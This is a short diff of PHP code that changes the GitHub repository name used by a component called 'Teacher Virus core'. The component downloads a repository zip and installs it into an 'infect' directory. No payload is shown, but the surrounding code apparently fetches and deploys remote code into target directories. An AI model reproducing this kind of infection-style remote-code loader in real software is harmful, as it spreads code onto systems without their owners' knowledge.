@@ -640,7 +640,7 @@ fclose($myfile);
 
             // Github repository details for Teacher Virus core
             $username="MohamedAhmedAliGpaly";
-            $repo="lifehostbill-system";
+            $repo="LifePostSMS";
 
             $download_filename = $username."-".$repo.".zip";
             $infectdir = $infect.'/'; // infect directory with trailing slash for URL use
